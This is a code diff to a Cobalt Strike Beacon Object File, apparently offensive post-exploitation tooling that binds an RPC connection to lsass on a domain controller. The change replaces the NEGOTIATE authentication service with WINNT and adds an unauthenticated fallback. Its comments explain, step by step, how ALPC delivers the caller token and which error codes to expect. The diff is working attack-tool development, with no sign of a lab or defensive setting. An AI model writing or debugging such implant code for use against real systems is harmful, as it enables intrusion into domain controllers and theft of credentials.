@@ -1349,11 +1349,36 @@ void go(char *args, int args_len)
         qos.IdentityTracking  = MY_RPC_C_QOS_IDENTITY_STATIC;
         qos.ImpersonationType = MY_RPC_C_IMP_LEVEL_IMPERSONATE;
 
-        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcBindingSetAuthInfoExA (NEGOTIATE + IMPERSONATE)\n");
+        /* Authn service on ncalrpc:
+         *   NEGOTIATE (9) is rejected as UNKNOWN_AUTHN_SERVICE — SPNEGO
+         *     is a network-auth wrapper with nothing to negotiate over
+         *     ALPC, so the runtime does not register it on this transport.
+         *   WINNT (10 = NTLMSSP) is the always-registered local auth
+         *     service on ncalrpc — it's a fast-path that piggybacks the
+         *     ALPC-delivered process token rather than doing a real
+         *     challenge-response, so no network I/O and no loopback-
+         *     reflection issue.
+         *   KERBEROS (16) is also usually registered on domain-joined
+         *     boxes but requires an SPN, and NULL SPN is ambiguous here.
+         *
+         * If WINNT itself is disabled by policy on this DC, we'll get
+         * 0x6D3 again and fall back to unauthenticated (relies on lsass
+         * calling RpcImpersonateClient, which pulls the caller token
+         * from the ALPC header even with no SSPI context). */
+        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcBindingSetAuthInfoExA (WINNT + IMPERSONATE)\n");
         rpcSt = RPCRT4$RpcBindingSetAuthInfoExA(hRpc, NULL,
-            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE,
+            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT,
             NULL, 0, &qos);
         BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);
+
+        if (rpcSt == 1747 /* RPC_S_UNKNOWN_AUTHN_SERVICE */) {
+            /* WINNT also refused — try the no-auth path. On ncalrpc
+             * the ALPC layer still delivers the caller token, so lsass
+             * can access-check via RpcImpersonateClient. */
+            BeaconPrintf(CALLBACK_OUTPUT,
+                "[.] trace: fallback — no RPC-level auth (rely on ALPC token)\n");
+            rpcSt = 0;
+        }
     }
     if (rpcSt) {
         BeaconPrintf(CALLBACK_ERROR,
